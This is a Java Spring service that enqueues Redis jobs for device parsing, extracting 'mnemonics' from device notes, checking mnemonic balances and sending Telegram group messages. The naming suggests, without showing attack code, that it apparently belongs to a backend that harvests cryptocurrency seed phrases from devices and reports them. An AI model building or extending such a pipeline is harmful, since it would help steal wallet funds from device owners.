package com.consumer.service;

import java.util.LinkedHashMap;
import java.util.Map;

import org.apache.commons.lang3.StringUtils;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;

import com.alibaba.fastjson.JSON;
import com.consumer.config.V26ConsumerProperties;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Service
@RequiredArgsConstructor
public class ParseQueueService {

    private final StringRedisTemplate redis;
    private final V26ConsumerProperties props;

    public boolean enqueueDeviceParse(String deviceId, Map<String, Object> meta) {
        return push(props.getQueue().getDeviceParse(), deviceId, meta);
    }

    public boolean enqueueDeviceParseV1(String deviceId, Map<String, Object> meta) {
        Map<String, Object> m = meta != null ? new LinkedHashMap<>(meta) : new LinkedHashMap<>();
        if (!m.containsKey("interversion")) {
            m.put("interversion", "v1");
        }
        return push(props.getQueue().getDeviceParseV1(), deviceId, m);
    }

    public boolean enqueueNotesMnemonic(String deviceId, Map<String, Object> meta) {
        return enqueueNotesMnemonic(deviceId, meta, false);
    }

    public boolean enqueueNotesMnemonic(String deviceId, Map<String, Object> meta, boolean v1) {
        String did = StringUtils.trimToEmpty(deviceId);
        if (did.isEmpty()) {
            return false;
        }
        Map<String, Object> payload = new LinkedHashMap<>();
        payload.put("device_id", did);
        payload.put("meta", meta != null ? meta : new LinkedHashMap<>());
        String queue = v1 ? props.getQueue().getNotesMnemonicV1() : props.getQueue().getNotesMnemonic();
        try {
            redis.opsForList().rightPush(queue, JSON.toJSONString(payload));
            log.info("notes mnemonic enqueued queue={} device={}", queue, did);
            return true;
        } catch (Exception e) {
            log.warn("notes mnemonic enqueue failed device={}: {}", did, e.toString());
            return false;
        }
    }

    public boolean enqueuePackageAddress(String deviceId, boolean v1) {
        String did = StringUtils.trimToEmpty(deviceId);
        if (did.isEmpty()) {
            return false;
        }
        Map<String, Object> payload = new LinkedHashMap<>();
        payload.put("device_id", did);
        String queue = v1 ? props.getQueue().getPackageAddressV1() : props.getQueue().getPackageAddress();
        try {
            redis.opsForList().rightPush(queue, JSON.toJSONString(payload));
            return true;
        } catch (Exception e) {
            log.warn("package address enqueue failed device={}: {}", did, e.toString());
            return false;
        }
    }

    public boolean enqueueMnemonicBalance(long mnemonicId, String deviceId) {
        return enqueueMnemonicBalance(mnemonicId, deviceId, false);
    }

    public boolean enqueueMnemonicBalance(long mnemonicId, String deviceId, boolean v1) {
        if (mnemonicId <= 0) {
            return false;
        }
        Map<String, Object> payload = new LinkedHashMap<>();
        payload.put("mnemonic_id", mnemonicId);
        payload.put("device_id", StringUtils.trimToEmpty(deviceId));
        String queue = v1 ? props.getQueue().getMnemonicBalanceV1() : props.getQueue().getMnemonicBalance();
        try {
            redis.opsForList().rightPush(queue, JSON.toJSONString(payload));
            return true;
        } catch (Exception e) {
            log.warn("mnemonic balance enqueue failed id={}: {}", mnemonicId, e.toString());
            return false;
        }
    }

    private boolean push(String queue, String deviceId, Map<String, Object> meta) {
        String did = StringUtils.trimToEmpty(deviceId);
        if (did.isEmpty()) {
            return false;
        }
        Map<String, Object> payload = new LinkedHashMap<>();
        payload.put("device_id", did);
        payload.put("meta", meta != null ? meta : new LinkedHashMap<>());
        try {
            redis.opsForList().rightPush(queue, JSON.toJSONString(payload));
            return true;
        } catch (Exception e) {
            log.warn("device parse enqueue failed queue={} device={}: {}", queue, did, e.toString());
            return false;
        }
    }

    public boolean enqueueTelegram(String robotId, String groupId, String text, Map<String, Object> meta) {
        if (StringUtils.isAnyBlank(robotId, groupId, text)) {
            return false;
        }
        Map<String, Object> payload = new LinkedHashMap<>();
        payload.put("robot_id", robotId.trim());
        payload.put("group_id", groupId.trim());
        payload.put("text", text);
        payload.put("meta", meta != null ? meta : new LinkedHashMap<>());
        try {
            redis.opsForList().rightPush(props.getQueue().getTgMessage(), JSON.toJSONString(payload));
            Object did = meta == null ? "" : meta.get("device_id");
            Object mid = meta == null ? "" : meta.get("mnemonic_id");
            Object tpl = meta == null ? "" : meta.get("template");
            log.info("【telegram】enqueued group={} device={} mnemonic_id={} template={} chars={}",
                    groupId.trim(), did, mid, tpl, text.length());
            return true;
        } catch (Exception e) {
            log.warn("tg enqueue failed: {}", e.toString());
            return false;
        }
    }
}
